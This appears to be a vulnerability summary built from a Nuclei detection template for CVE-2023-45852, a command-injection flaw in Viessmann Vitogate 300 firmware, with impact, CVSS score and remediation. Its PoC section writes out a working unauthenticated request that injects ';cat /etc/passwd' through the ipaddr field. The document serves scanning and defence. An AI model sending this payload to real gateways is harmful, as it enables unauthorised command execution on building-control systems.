---
cve_id: CVE-2023-45852
template_path: nuclei-templates/http/cves/2023/CVE-2023-45852.yaml
affected_product: Viessmann Vitogate 300
severity: critical
authentication: none
external_callback: false
affected_versions: 2.1.3.0
preconditions: []
poc_classification: rce
---

## Vulnerability
Viessmann Vitogate 300 firmware version 2.1.3.0 contains a command-injection flaw (CWE-77) in `/cgi-bin/vitogate.cgi`. The `put` method accepts JSON with an `ipaddr` parameter that is passed unsanitized to a shell command, allowing unauthenticated attackers to inject arbitrary shell metacharacters.  

**Impact**  
Remote arbitrary command execution with elevated privileges on the heating-control gateway, enabling full compromise of connected building-management systems.  

**CVSS 3.1**  
9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  

**Remediation**  
Update firmware to any version newer than 2.1.3.0 that sanitizes the `ipaddr` parameter.

## PoC / Detection
Classification: rce  

The template issues one unauthenticated raw POST request:  
```http
POST /cgi-bin/vitogate.cgi
Content-Type: application/json

{"method":"put","form":"form-4-8","session":"","params":{"ipaddr":"{{randstr}};cat /etc/passwd"}}
```  
Matchers confirm success when `status_code == 200`, `Content-Type` contains `application/json`, and the body simultaneously contains the traceroute error string `traceroute: {{randstr}}: Unknown host` and the passwd entry `daemon:x:1:1:` (proof of command execution).

## References
- https://connectivity.viessmann.com/gb/mp-fp/vitogate/vitogate-300-bn-mb.html
- https://github.com/Push3AX/vul/blob/main/viessmann/Vitogate300_RCE.md
- https://nvd.nist.gov/vuln/detail/CVE-2023-45852
- https://github.com/tanjiti/sec_profile
- https://github.com/komodoooo/Some-things
